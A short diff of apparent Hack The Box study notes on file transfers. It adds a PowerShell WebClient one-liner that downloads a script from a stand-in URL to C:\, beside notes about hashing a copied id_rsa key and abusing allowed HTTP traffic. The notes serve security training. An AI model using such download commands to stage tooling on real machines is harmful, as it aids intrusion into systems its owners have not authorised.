@@ -40,6 +40,10 @@ PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
 - Powershell can execute and download files from internet using *HTTP, HTTPS, AND FTP*
 - Most companies allow HTTP/HTTPs traffic so this is a vulnerability
 
-```bash
-
+#### Saving File to Disk
+```powershell
+(New-Object Net.WebClient).DownloadFile('https://example.com/script.ps1', 'C:\script.ps1')
 ```
+
+- Downloads `script.ps1` from the URL
+- Saves it to `C:\script.ps1` but doesn't execute it
